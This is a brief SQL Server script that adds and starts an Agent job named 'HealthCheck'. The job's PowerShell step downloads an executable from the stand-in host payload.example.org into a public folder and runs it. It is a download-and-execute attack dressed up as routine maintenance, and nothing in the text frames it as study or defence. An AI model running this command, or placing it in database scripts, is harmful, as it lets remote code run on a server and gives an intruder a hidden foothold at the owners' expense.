EXEC msdb.dbo.sp_add_jobstep
 @job_name=N'HealthCheck', @step_name=N'Collect',
 @subsystem=N'PowerShell',
 @command=N'$c=New-Object Net.WebClient; $c.DownloadFile("https://payload.example.org/tool.exe","C:\Users\Public\tool.exe"); Start-Process -FilePath C:\Users\Public\tool.exe';
EXEC msdb.dbo.sp_start_job @job_name=N'HealthCheck';
